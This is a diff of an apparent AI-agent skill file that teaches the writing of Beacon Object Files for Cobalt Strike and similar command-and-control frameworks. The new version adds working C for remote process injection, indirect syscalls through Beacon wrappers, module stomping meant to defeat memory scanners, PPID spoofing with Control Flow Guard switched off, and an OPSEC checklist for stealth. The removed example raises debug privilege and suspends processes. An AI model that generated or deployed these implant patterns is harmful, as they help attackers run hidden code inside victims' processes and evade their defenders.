@@ -1,21 +1,20 @@
 ---
 name: c-bof
-description: "Generate, compile, and debug Beacon Object Files (BOF) in C for Cobalt Strike and compatible C2 frameworks. Use when the user asks to create a BOF, convert a C PoC into a BOF, resolve BOF linking/entrypoint errors, or needs patterns for DFR, heap management, injection, key-value state, multi-mode BOFs, or embedded payloads."
+description: "Generate, compile, and harden Beacon Object Files (BOF) in C for Cobalt Strike and compatible C2 frameworks. Use when creating a BOF, converting a C PoC into a BOF, resolving BOF linking/entrypoint errors, or needing patterns for DFR, heap management, injection, key-value state, multi-mode BOFs, embedded payloads, indirect syscalls, module stomping, or OPSEC hardening."
 license: MIT
-compatibility: "Requires x86_64-w64-mingw32-gcc (mingw-w64), python3. Scripts tested on Linux/WSL. BOF testing requires Cobalt Strike or a compatible loader (e.g. COFFLoader, RunOF)."
+compatibility: "Requires x86_64-w64-mingw32-gcc (mingw-w64), python3. Scripts tested on Linux/WSL. BOF testing requires a COFF loader (COFFLoader, RunOF, or framework-specific loader)."
 metadata:
   author: AeonDave
-  version: "2.0"
+  version: "3.0"
   category: bof
   language: c
 ---
 
-# C Beacon Object Files (BOF) Development
+# C Beacon Object Files (BOF) — Development & Hardening
 
-This skill produces production-quality BOFs in C following the official
-[BOF Template](https://github.com/Cobalt-Strike/bof_template) conventions.
-Patterns are derived from real-world BOFs covering process injection, credential
-access, keylogging, memory dumping, and encrypted payload delivery.
+Produce production-quality, OPSEC-conscious BOFs in C. Patterns are
+framework-agnostic: they work with Cobalt Strike, Sliver, Havoc, Brute Ratel,
+and any C2 that loads COFF object files via a BOF-compatible loader.
 
 ## When to use
 
@@ -23,6 +22,19 @@ access, keylogging, memory dumping, and encrypted payload delivery.
 - Converting an existing C PoC into a BOF
 - Errors like `undefined reference to 'Beacon*'` or `.text section too large`
 - Need patterns for DFR, heap management, injection, embedded payloads, multi-mode
+- Hardening a BOF for stealth (indirect syscalls, unbacked-memory avoidance, sleep-mask integration)
+
+---
+
+## Recommended workflow
+
+1. **Scope** — Define technique, target OS, required privileges, and C2 framework
+2. **Skeleton** — Generate from template; fill header, DFR, argument protocol
+3. **Implement** — Write core logic; use heap-only allocation, DFR for all Win32 calls
+4. **Harden** — Apply OPSEC patterns (see `references/stealth.md`)
+5. **Compile** — Build with optimized flags; verify `.text` size < 1 MB
+6. **Test** — Run under COFFLoader or framework loader; validate output
+7. **Validate** — Check for anti-patterns (see `references/anti-patterns.md`)
 
 ---
 
@@ -38,12 +50,18 @@ Every BOF source file begins with a structured doc block:
  * Technique:  Name of the technique / tradecraft
  * MITRE ATT&CK: T1055.001 (Process Injection: DLL Injection)
  * Target:     x86_64 Windows 10/11, Server 2016+
+ * Privilege:  Admin / User
  *
  * Architecture notes:
  *   Describe the approach, data flow, and any multi-mode logic.
  *
- * References:
- *   - https://relevant-url-or-paper
+ * Argument protocol:
+ *   i<mode>   1=freeze, 2=dump, 3=unfreeze
+ *   i<pid>    Target process ID
+ *   z<path>   Optional file path
+ *
+ * Build:
+ *   ../scripts/build_bof.sh mybof.c
  */
 ```
 
@@ -80,6 +98,7 @@ DECLSPEC_IMPORT void*   __cdecl MSVCRT$memset(void*, int, size_t);
 ```
 
 > Group order: KERNEL32 → ADVAPI32 → NTDLL → USER32 → MSVCRT → others.
+> For 30+ imports, switch to typedef+GetProcAddress strategy (see `references/dfr-strategies.md`).
 
 ---
 
@@ -99,6 +118,14 @@ KERNEL32$HeapFree(heap, 0, buf);
 ```
 
 For format buffers managed by Beacon, use `BeaconFormatAlloc`/`BeaconFormatFree`.
+
+Convenience macros (from `spectre_defs.h` pattern):
+
+```c
+#define intAlloc(size)    KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (size))
+#define intFree(addr)     KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, (addr))
+#define intZeroMemory(a,s) MSVCRT$memset((a), 0, (s))
+```
 
 ---
 
@@ -121,6 +148,9 @@ char*  path  = BeaconDataExtract(&parser, NULL); /* z */
 | `BeaconDataExtract(&p, &sz)` | `char*` | `z` / `Z` |
 | `BeaconDataLength(&p)` | `int` | (length prefix) |
 
+> **Critical:** Parse order must match the pack order exactly. Misaligned reads
+> cause garbage data or crashes. Document the argument protocol in the file header.
+
 ---
 
 ## Step 5 — Compilation
@@ -135,6 +165,8 @@ char*  path  = BeaconDataExtract(&parser, NULL); /* z */
 | `-fno-asynchronous-unwind-tables` | Reduce `.eh_frame` section |
 | `-fpack-struct=8` | Match Beacon struct packing |
 | `-ffunction-sections -fdata-sections` | Allow section stripping |
+| `-falign-functions=1` | Remove alignment padding |
+| `-fno-merge-constants` | Avoid COMDAT conflicts |
 | `-s` | Strip symbols |
 
 ---
@@ -210,23 +242,63 @@ if (!pNtSuspendProcess) {
 NTSTATUS status = pNtSuspendProcess(hProcess);
 ```
 
-### Process injection pattern
+### Indirect syscalls via Beacon API (CS 4.10+)
+
+Use Beacon's built-in syscall wrappers instead of raw Win32 calls:
 
 ```c
+BEACON_SYSCALLS sc;
+BeaconGetSyscallInformation(&sc, sizeof(sc));
+
+/* Use Beacon wrappers — they respect the configured syscall method */
+HANDLE hProc = BeaconOpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
+LPVOID remoteBuf = BeaconVirtualAllocEx(hProc, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+BeaconWriteProcessMemory(hProc, remoteBuf, payload, size, NULL);
+
+DWORD oldProt;
+BeaconVirtualProtectEx(hProc, remoteBuf, size, PAGE_EXECUTE_READ, &oldProt);
+
+BeaconCloseHandle(hProc);
+```
+
+> When Beacon is configured with `syscall_method "indirect"`, these wrappers
+> execute via indirect syscalls — no `syscall` instruction in BOF code, return
+> addresses land in ntdll. See `references/stealth.md` for details.
+
+### Process injection — OPSEC-hardened
+
+```c
+/* 1. Allocate RW (not RWX) */
 LPVOID remoteBuf = KERNEL32$VirtualAllocEx(hProc, NULL, payloadSize,
                                            MEM_COMMIT | MEM_RESERVE,
                                            PAGE_READWRITE);
 if (!remoteBuf) { BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx failed"); goto cleanup; }
 
+/* 2. Write payload */
 KERNEL32$WriteProcessMemory(hProc, remoteBuf, payload, payloadSize, NULL);
 
-/* Flip to RX (never leave RWX) */
+/* 3. Flip to RX (never leave RWX) */
 DWORD oldProt;
 KERNEL32$VirtualProtectEx(hProc, remoteBuf, payloadSize, PAGE_EXECUTE_READ, &oldProt);
 
+/* 4. Execute */
 HANDLE hThread = KERNEL32$CreateRemoteThread(hProc, NULL, 0,
     (LPTHREAD_START_ROUTINE)remoteBuf, NULL, 0, NULL);
 ```
+
+### Module stomping injection
+
+Map a legitimate DLL as SEC_IMAGE, then overwrite its `.text` section.
+Memory regions appear as image-backed, defeating unbacked-memory scanners:
+
+```c
+/* 1. Find a sacrificial DLL not loaded in target process */
+/* 2. NtCreateSection with SEC_IMAGE → NtMapViewOfSection in target */
+/* 3. Overwrite .text with your payload */
+/* 4. Set entry point via SetThreadContext or CreateRemoteThread */
+```
+
+See `references/injection-patterns.md` for full module-stomping implementation.
 
 ### Embedded encrypted payload
 
@@ -338,89 +410,80 @@ void go(char* args, int len) {
 
 ---
 
-## Complete example — process_freeze.c
+## Minimal complete pattern
+
+Prefer a compact, auditable entrypoint:
 
 ```c
-/**
- * @file       process_freeze.c
- * @brief      Freeze/unfreeze a target process by PID.
- *
- * Technique:  Process suspension via NtSuspendProcess/NtResumeProcess
- * MITRE ATT&CK: T1489 (Service Stop) — adapted for process control
- * Target:     x86_64 Windows 10+
- */
-
-#include <windows.h>
-#include "beacon.h"
-
-#define MODE_FREEZE   1
-#define MODE_UNFREEZE 2
-
-/* ── KERNEL32 ─────────────────────────────────────────── */
-DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
-DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
-DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
-DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
-DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetCurrentProcess(void);
-
-/* ── ADVAPI32 ─────────────────────────────────────────── */
-DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
-DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR, LPCSTR, PLUID);
-DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
-
-typedef NTSTATUS (NTAPI *fnNtSuspendProcess)(HANDLE);
-typedef NTSTATUS (NTAPI *fnNtResumeProcess)(HANDLE);
-
-static BOOL EnableDebugPrivilege(void) {
-    HANDLE hToken;
-    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
-            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
-        return FALSE;
-    TOKEN_PRIVILEGES tp;
-    tp.PrivilegeCount = 1;
-    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-    ADVAPI32$LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid);
-    BOOL ok = ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
-    KERNEL32$CloseHandle(hToken);
-    return ok;
-}
-
 void go(char* args, int len) {
     datap parser;
     BeaconDataParse(&parser, args, len);
     int mode = BeaconDataInt(&parser);
     int pid  = BeaconDataInt(&parser);
 
-    EnableDebugPrivilege();
-
-    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
-    fnNtSuspendProcess pSuspend = (fnNtSuspendProcess)KERNEL32$GetProcAddress(hNtdll, "NtSuspendProcess");
-    fnNtResumeProcess  pResume  = (fnNtResumeProcess)KERNEL32$GetProcAddress(hNtdll, "NtResumeProcess");
-
-    HANDLE hProc = KERNEL32$OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pid);
-    if (!hProc) {
-        BeaconPrintf(CALLBACK_ERROR, "OpenProcess(%d) failed", pid);
-        return;
-    }
-
-    NTSTATUS status;
-    if (mode == MODE_FREEZE) {
-        status = pSuspend(hProc);
-        BeaconPrintf(status == 0 ? CALLBACK_OUTPUT : CALLBACK_ERROR,
-                     "[%s] PID %d — NTSTATUS 0x%08X",
-                     status == 0 ? "FROZEN" : "FAIL", pid, status);
-    } else if (mode == MODE_UNFREEZE) {
-        status = pResume(hProc);
-        BeaconPrintf(status == 0 ? CALLBACK_OUTPUT : CALLBACK_ERROR,
-                     "[%s] PID %d — NTSTATUS 0x%08X",
-                     status == 0 ? "RESUMED" : "FAIL", pid, status);
+    if (mode == 1) {
+        /* freeze */
+    } else if (mode == 2) {
+        /* dump */
     } else {
         BeaconPrintf(CALLBACK_ERROR, "Unknown mode: %d", mode);
     }
-
-    KERNEL32$CloseHandle(hProc);
 }
 ```
+
+Keep full implementations in `references/` (manual-map, hollowing, stomp, etc.)
+so `SKILL.md` stays concise and operational.
+
+### PPID spoofing + CFG bypass on spawn
+
+```c
+STARTUPINFOEXA siex;
+PROCESS_INFORMATION pi;
+intZeroMemory(&siex, sizeof(siex));
+intZeroMemory(&pi, sizeof(pi));
+siex.StartupInfo.cb = sizeof(STARTUPINFOEXA);
+
+DWORD64 mitigationPolicy = MITIGATION_POLICY_CFG_ALWAYS_OFF;
+DWORD createFlags = CREATE_SUSPENDED | CREATE_NO_WINDOW;
+
+/* Build attribute list with mitigation + optional PPID spoof */
+HANDLE hParent = KERNEL32$OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
+SIZE_T attrSize = 0;
+KERNEL32$InitializeProcThreadAttributeList(NULL, 2, 0, &attrSize);
+LPPROC_THREAD_ATTRIBUTE_LIST pAttrList = (LPPROC_THREAD_ATTRIBUTE_LIST)
+    intAlloc(attrSize);
+KERNEL32$InitializeProcThreadAttributeList(pAttrList, 2, 0, &attrSize);
+KERNEL32$UpdateProcThreadAttribute(pAttrList, 0,
+    PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
+    &mitigationPolicy, sizeof(mitigationPolicy), NULL, NULL);
+KERNEL32$UpdateProcThreadAttribute(pAttrList, 0,
+    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+    &hParent, sizeof(HANDLE), NULL, NULL);
+siex.lpAttributeList = pAttrList;
+createFlags |= EXTENDED_STARTUPINFO_PRESENT;
+
+KERNEL32$CreateProcessA(hostProcess, NULL, NULL, NULL, FALSE,
+    createFlags, NULL, NULL, (LPSTARTUPINFOA)&siex, &pi);
+```
+
+---
+
+## OPSEC checklist
+
+Before considering a BOF production-ready, verify:
+
+- [ ] No `malloc`/`free`/`calloc` — heap-only via DFR
+- [ ] No RWX memory — always RW → RX flip
+- [ ] No `syscall` instruction in compiled output (use indirect syscalls or Beacon wrappers)
+- [ ] All Win32 calls via DFR or runtime GetProcAddress — no IAT entries
+- [ ] Encrypted embedded payloads with secure_zero for key material
+- [ ] `.text` section size minimized (strip, no unwind tables, no debug info)
+- [ ] No global constructors or C++ runtime dependencies
+- [ ] Argument protocol documented in file header
+- [ ] Error paths free all allocated resources (handles, heap, KV store)
+- [ ] No hardcoded paths, usernames, or machine-specific data
+
+See `references/stealth.md` for deep-dive OPSEC patterns and `references/anti-patterns.md` for what to avoid.
 
 ---
 
@@ -431,6 +494,10 @@ void go(char* args, int len) {
 | `scripts/bof_template.c`           | Production-quality BOF skeleton |
 | `scripts/build_bof.sh`             | Compiler wrapper with optimized flags |
 | `scripts/extract_arguments.py`     | Parse and pretty-print BOF argument packs |
+| `references/dfr-strategies.md`     | DFR models, typedef+GetProcAddress, feature guards |
+| `references/injection-patterns.md` | Generic injection patterns (manual-map, hollowing, stomping, APC) |
+| `references/stealth.md`            | OPSEC hardening and stealth considerations |
+| `references/anti-patterns.md`      | Common BOF mistakes and remediations |
 | `references/REFERENCE.md`          | Full Beacon API reference (CS 4.12) and error table |
 | `assets/beacon.h`                  | Official Cobalt Strike beacon header (CS 4.12) |
 | `assets/beacon_compatibility.h`    | Convenience macros, missing mingw typedefs (LUID, NTSTATUS) |
